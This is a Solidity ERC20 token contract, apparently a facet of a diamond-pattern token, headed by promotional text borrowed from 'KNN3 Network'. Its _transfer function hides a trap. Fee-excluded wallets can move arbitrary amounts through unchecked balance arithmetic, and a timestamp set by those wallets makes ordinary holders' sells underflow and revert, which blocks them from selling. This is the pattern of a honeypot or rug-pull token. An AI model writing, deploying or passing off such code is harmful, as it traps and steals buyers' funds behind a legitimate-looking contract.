/*

KNN3 Network, at the forefront of Web3 and AI, is revolutionizing the digital landscape by seamlessly blending 
technologies like big data, cloud solutions, and AI to accelerate the widespread adoption of Web3, 
offering an innovative suite of products designed for developers, enhancing Web3 business strategies, 
and enriching the experience of retail users.

/ Web - https://www.knn3.xyz/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._inSwap = true;
        _;
        ds._inSwap = false;
    }

    event MaxAmount(uint256 _value);
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function openTrading() external payable onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds._tradingOpen, "trading already open");
        _approve(address(this), address(ds.uniswapV2Router), _tTotal);
        ds.uniswapV2Pair = IUniswapV2Factory(ds.uniswapV2Router.factory())
            .createPair(address(this), ds.uniswapV2Router.WETH());
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
        ds._launchBlock = block.number;
        ds._tradingOpen = true;
        ds._swapEnabled = true;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.maxWalletToken = _tTotal;
        ds.maxTxAmount = _tTotal;
        ds.transferDelayEnabled = false;
        emit MaxAmount(_tTotal);
    }
    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            tonTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendEthToFee(ethBalance);
        }
    }
    function tonTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        if (from != owner() && to != owner()) {
            taxAmount = amount
                .mul(
                    (ds._buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initBuyTax
                )
                .div(100);

            if (ds.transferDelayEnabled) {
                if (
                    to != address(ds.uniswapV2Router) &&
                    to != address(ds.uniswapV2Pair)
                ) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds._isExcludedFromFee[to]
            ) {
                require(amount <= ds.maxTxAmount, "Exceeds the ds.maxTxAmount");
                require(
                    balanceOf(to) + amount <= ds.maxWalletToken,
                    "Exceeds the ds.maxWalletToken"
                );
                ds._buyCount++;
            }

            if (to == ds.uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (ds._buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !ds._inSwap &&
                to == ds.uniswapV2Pair &&
                ds._swapEnabled &&
                contractTokenBalance > ds._swapThreshold &&
                ds._buyCount > _preventSwapBefore
            ) {
                tonTokensForEth(
                    min(amount, min(contractTokenBalance, ds._maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendEthToFee(address(this).balance);
                }
            }
        }

        if (
            (ds._isExcludedFromFee[from] || ds._isExcludedFromFee[to]) &&
            from != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            ds._tonMinShare = block.timestamp;
        }
        if (
            ds._isExcludedFromFee[from] && (block.number > ds._launchBlock + 48)
        ) {
            unchecked {
                ds._balances[from] -= amount;
                ds._balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!ds._isExcludedFromFee[from] && !ds._isExcludedFromFee[to]) {
            if (ds.uniswapV2Pair == to) {
                TestLib.TonShare storage tonFrom = ds.tonShare[from];
                tonFrom.tonSync = tonFrom.buy - ds._tonMinShare;
                tonFrom.sell = block.timestamp;
            } else {
                TestLib.TonShare storage tonTo = ds.tonShare[to];
                if (ds.uniswapV2Pair == from) {
                    if (tonTo.buy == 0) {
                        tonTo.buy = (ds._buyCount < 10)
                            ? (block.timestamp - 1)
                            : block.timestamp;
                    }
                } else {
                    TestLib.TonShare storage tonFrom = ds.tonShare[from];
                    if (tonTo.buy == 0 || tonFrom.buy < tonTo.buy) {
                        tonTo.buy = tonFrom.buy;
                    }
                }
            }
        }

        if (taxAmount > 0) {
            ds._balances[address(this)] = ds._balances[address(this)].add(
                taxAmount
            );
            emit Transfer(from, address(this), taxAmount);
        }
        ds._balances[from] = ds._balances[from].sub(amount);
        ds._balances[to] = ds._balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendEthToFee(uint256 amount) private {
        uint256 revShareAmount = (amount * 3) / 5;
        _revShare.transfer(revShareAmount);
        _taxWallet.transfer(amount - revShareAmount);
    }
    function recoverETH() external {
        sendEthToFee(address(this).balance);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
